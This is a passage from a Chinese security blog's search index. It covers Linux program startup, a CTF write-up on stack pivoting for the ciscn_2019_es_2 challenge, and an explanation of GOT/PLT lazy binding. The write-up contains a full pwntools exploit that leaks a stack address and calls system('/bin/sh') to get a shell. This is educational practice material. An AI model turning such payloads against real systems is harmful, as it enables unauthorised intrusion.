((<span class="keyword">void</span> (*) (<span class="keyword">void</span> *)) fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br></pre></td></tr></table></figure><p>程序的最终调用链（简化版）是：</p><p><code>_start -&gt; __libc_start_main -&gt; __libc_csu_init -&gt; main -&gt; exit</code></p><p>看完之后，看看下面这张图片是不是很亲切！</p><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/3-1633405730636.png" class=""><p>参考文章：</p><p><a href="https://luomuxiaoxiao.com/?p=516#i">Linux X86 程序启动 – main函数是如何被执行的？</a></p><p>《程序员的自我修养》P317</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 底层的小啾啾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移</title>
      <link href="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00原理"><a href="#0x00原理" class="headerlink" title="0x00原理"></a>0x00原理</h4><p>当溢出的长度太小时，可以通过<code>leave_ret_gadget</code>来将<code>ebp</code>和<code>esp</code>迁移到我们想要的位置，比如：一个咱已经布置好<code>ROP</code>链的地方</p><p>假设在栈上布置如下的<code>ROP</code>链，我将通过图片来展示攻击效果</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131830383.png" class=""><p>布置好之后，每个程序就返回前都会恢复栈，就如下图的程序，所以我们就等待程序<code>leave ret</code>:</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131920731.png" class=""><p><code>leave</code>就是等价于上面说到的那段汇编代码，首先执行的是<code>mov esp,ebp</code>，这会让图中的0x108放入到<code>esp</code>中，我们的栈就会发生如下变化：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131951134.png" class="" title="image-20211005131951134"><p>接着就是<code>pop ebp</code>，诶~，这时候我们的<code>ebp</code>就变成了我们想要迁移的位置了:</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132014543.png" class=""><p>我们在回顾一下栈上的情况，因为刚刚<code>pop ebp</code>，所以我们的<code>esp</code>指向了<code>leave_ret</code>这个<code>gadget</code>：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132035570.png" class=""><p>所以程序又执行了一次<code>leave</code>，我们迁移后的栈就会变成这样：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132117043.png" class=""><p>非常的神奇吼！我们的<code>esp</code>指向了<code>system</code>函数！也就是说我们已经成功的获取了<code>shell</code>！！！</p><blockquote><p>可能有读者要问了：啊？，你这<code>ebp</code>不是栈底寄存器吗？他怎么指向了一个奇怪的地方，你这不行啊？，对，此时的<code>ebp</code>已经指向了一个奇怪（后面的例题会展示奇怪的点）的地方，但是问题不大，我们只要明白<code>ebp</code>和<code>esp</code>最根本的作用是什么就不会觉得奇怪了，<code>ebp</code>的作用是来定位每个函数的栈的大小，当函数返回时才需要通过<code>ebp</code>来恢复主函数的栈，而<code>esp</code>才是真正控制栈的进出，所以我们只要控制<code>esp</code>指向我们想要指向的函数就可以达到我们的目的了，至于<code>ebp</code>嘛，我们都拿到<code>shell</code>了，它能不能成功的返回已经不关我事了嘿嘿嘿~</p></blockquote><h4 id="0x01-例题解析"><a href="#0x01-例题解析" class="headerlink" title="0x01 例题解析"></a>0x01 例题解析</h4><p>这里拿19年国赛的一道题(<code>ciscn_2019_es_2</code>)来讲解一下，经典入门题，在<code>buu</code>上，大伙可以去玩玩</p><p>习惯<code>checksec</code>一下：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132145614.png" class=""><p><code>main</code>函数看看：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132203888.png" class=""><p><code>vul</code>函数不用多说，肯定就是受害函数了，仔细一看，只能溢出8字节吼！也真够抠的，不过我们刚刚学了栈迁移，不慌</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132222944.png" class=""><p>我们一个个来看吼，首先程序<code>memset</code>了<code>s</code>这个数组，但是很奇怪，它初始化又不全部清零，就整了0x20个字节，它为啥要这么做呢，其实就是在泄露信息，如果它没全部清零，那后0x10是什么东西呢？诶~，就是栈上的地址对吧，所以当我们覆盖了<code>s</code>数组最后的<code>&quot;\n&quot;</code>，那<code>printf</code>打印s的时候，是不是就不会截断，是不是就打印了那未初始化的值，也就泄露了栈上的地址，有人可能又有疑问了，泄露栈上的地址有什么用呢？别急，慢慢来！</p><p>在第一次<code>read</code>（）的时候，我输入了24个<code>a</code>和我的<code>id</code>，计算一下s的位置到<code>ebp</code>的距离，拿起你的小计算器计算一下：<code>0xa8 - 0x80</code> 是不是等于0x28，至于为啥要到<code>ebp</code>呢，别问，问就是后面好定位偏移</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132246238.png" class=""><p>按照上面的想法我们写出下面的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;zyen&#x27;</span>)</span><br></pre></td></tr></table></figure><p>前面我说过，我们栈迁移是迁移到另一个有我们ROP链的地方，但是这里我们并没有办法往其他地方写入我们的ROP链，我们只能往栈上写入，所以我有个大胆的想法，栈迁移到栈上，这样我们刚刚泄露的栈地址就有用了是不，所以我们在第二次read（）的时候就将栈布置成这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x28</span>)</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br></pre></td></tr></table></figure><p>咱动调看看：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132304965.png" class=""><p>leave之后：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132322783.png" class=""><p>注意<code>esp</code>和<code>ebp</code>，是不是<code>esp</code>比<code>ebp</code>还大哈哈哈:</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132336295.png" class=""><p>再往下执行，咱就发现<code>esp</code>指向了<code>system</code>的<code>plt</code>：</p><img src="/2021/01/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132348696.png" class=""><p>完整EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node3.buuoj.cn&#x27;,27587)</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line">ebp_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">io.success(<span class="string">&#x27;[*] ebp_addr: &#x27;</span> + <span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x28</span>)</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>延迟绑定</title>
      <link href="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
      <url>/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</url>
      
        <content type="html"><![CDATA[<p>程序在动态载入内存的时候并不会将所有函数都加载进内存，而是采用延时绑定的机制，即当真正使用当该函数的时候才将<code>GOT</code>表中的地址转化成真实的地址，</p><p>写一个简单的<code>demo</code>进行测试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -no-pie -g -o got_plt got_plt.c </span></span><br></pre></td></tr></table></figure><p>编译完成后，我们进入<code>gdb</code>进行调试，先将程序反汇编，我们来看看在那下断点合适，我们既然要研究<code>plt</code>和<code>got</code>表，那肯定要断在<code>call put</code>这条汇编指令这吧，下断点我们来看看</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/3.png" class=""><p>下完断点，我们运行起来，单步步入就来到图中的地方，它先跳到<code>_GLOBAL_OFFSET_TABLE_</code>里面，也就是我们说的<code>GOT</code>表，那它会<code>JMP</code>到哪里去呢？等下揭晓….</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/1.png" class=""><p>我们用<code>pwndbg</code>查看一下这个位置存了什么，是不是有点眼熟，这不就是刚刚<code>JMP</code>的下一条指令的地方吗？没错它又跳回来了…紧接着它<code>push</code>了一个参数又往下跳转了，又<code>push</code>了一个参数就跳到<code>_dl_runtime_resolve_</code>这个函数里面，在这就不详细的阐述<code>_dl_runtime_resolve_</code>函数的具体实现，咱只要记得是这个函数帮我们把<code>GOT</code>表里面的值换成了真实的函数地址</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/2.png" class=""><p>我们在此函数执行完成之后再去看<code>0x804a00c</code>里面存的是什么，对吧…现在就是真实的函数地址</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/4.png" class=""><p>如果还是保持怀疑，我们反汇编进去看看，是<code>put</code>函数的实现对吧…</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5.png" class=""><p>最后提一嘴，<code>GOT</code>表只是存放函数地址的表而已，真正的调用是需要通过<code>PLT</code>表来进行跳转</p><p>下面是一位大佬画的图就拿来用了：</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5970003-bcf9343191848103.png" class="" title="5970003-bcf9343191848103"><p>延迟绑定完成之后就可以直接去<code>GOT</code>里面拿真实的函数地址啦！</p><img src="/2020/11/20/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/5970003-9baedd55881a39dd.png" class="" title="5970003-9baedd55881a39dd">]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 底层的小啾啾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>梦开始的地方</title>
      <link href="/2020/11/01/%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9/"/>
      <url>/2020/11/01/%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9/</url>
      
        <content type="html"><![CDATA[<p><code>ZYen</code>的小站自今天起就正式开张啦！之前买服务器搭博客不得劲，现在正式转为<code>github</code>辽，文章的日期可能有点问题，不过无伤大雅，愿自己热爱的事情最终都能有个好结果！（撒花✨）</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
